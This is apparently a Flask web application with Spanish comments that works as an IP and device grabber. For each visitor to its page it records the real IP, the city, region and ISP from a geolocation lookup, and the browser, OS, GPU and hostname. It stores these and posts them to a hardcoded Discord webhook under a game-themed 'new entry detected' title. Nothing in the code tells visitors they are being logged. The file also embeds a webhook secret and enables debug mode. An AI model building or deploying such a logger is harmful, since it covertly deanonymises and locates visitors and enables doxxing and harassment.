from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timezone
import requests

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///datos.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class Registro(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ipv4 = db.Column(db.String(50))
    ipv6 = db.Column(db.String(50))
    region = db.Column(db.String(100))
    pais = db.Column(db.String(100))
    ciudad = db.Column(db.String(100))
    isp = db.Column(db.String(150))
    navegador = db.Column(db.String(100))
    user_agent = db.Column(db.String(300))
    sistema = db.Column(db.String(100))
    gpu = db.Column(db.String(200))
    hostname = db.Column(db.String(100))
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

with app.app_context():
    db.create_all()

def obtener_ip_real():
    """Obtiene la IP real del visitante (importante en Render)"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def obtener_ubicacion(ip):
    """Consulta geolocalización desde el servidor"""
    try:
        # API gratuita y estable
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,query", timeout=5)
        data = r.json()
        if data.get("status") == "success":
            return {
                "region": data.get("regionName") or "N/A",
                "pais": data.get("country") or "N/A",
                "ciudad": data.get("city") or "N/A",
                "isp": data.get("isp") or "N/A",
                "ipv4": data.get("query") or ip
            }
    except Exception as e:
        print("Error geolocalización:", str(e))
    
    return {
        "region": "No disponible",
        "pais": "No disponible",
        "ciudad": "No disponible",
        "isp": "No disponible",
        "ipv4": ip
    }

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/enviar', methods=['POST'])
def enviar():
    data = request.json or {}

    # IP real detectada por el servidor
    ip_servidor = obtener_ip_real()
    ubicacion = obtener_ubicacion(ip_servidor)

    # Preferimos la IP del servidor para la ubicación
    ipv4 = ubicacion["ipv4"] or data.get('ipv4') or "N/A"
    ipv6 = data.get('ipv6') or "N/A"

    nuevo = Registro(
        ipv4=ipv4,
        ipv6=ipv6,
        region=ubicacion["region"],
        pais=ubicacion["pais"],
        ciudad=ubicacion["ciudad"],
        isp=ubicacion["isp"],
        navegador=data.get('navegador'),
        user_agent=data.get('user_agent'),
        sistema=data.get('sistema'),
        gpu=data.get('gpu'),
        hostname=data.get('hostname')
    )
    db.session.add(nuevo)
    db.session.commit()

    # ========== CONFIGURACIÓN ==========
    WEBHOOK_URL = "https://discord.com/api/webhooks/1533636926358425801/vjbh3MBCTlK42UzWOACnQfusHVfM0jWTS-XVLRkHWNjctvSXtJP9qeCwdA6600LysicQ"
    # ===================================

    try:
        requests.post(
            WEBHOOK_URL,
            json={
                "embeds": [{
                    "title": "🎮 Nueva Entrada Detectada",
                    "color": 0x1b2838,
                    "fields": [
                        {"name": "(+) IPv4", "value": ipv4, "inline": True},
                        {"name": "(+) IPv6", "value": ipv6, "inline": True},
                        {"name": "(+) Región", "value": ubicacion["region"], "inline": True},
                        {"name": "(+) País", "value": ubicacion["pais"], "inline": True},
                        {"name": "(+) Ciudad", "value": ubicacion["ciudad"], "inline": True},
                        {"name": "(+) ISP", "value": ubicacion["isp"], "inline": True},
                        {"name": "(+) Navegador", "value": data.get('navegador', 'N/A'), "inline": True},
                        {"name": "(+) Sistema", "value": data.get('sistema', 'N/A'), "inline": True},
                        {"name": "(+) GPU", "value": data.get('gpu', 'No detectada'), "inline": False},
                        {"name": "(+) Hostname", "value": data.get('hostname', 'N/A'), "inline": True},
                        {"name": "(+) User Agent", "value": data.get('user_agent', 'N/A'), "inline": False},
                        {"name": "(+) ID Registro", "value": str(nuevo.id), "inline": True}
                    ],
                    "timestamp": datetime.now(timezone.utc).isoformat()
                }]
            },
            timeout=10
        )
    except Exception as e:
        print("Error webhook:", str(e))

    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(debug=True)
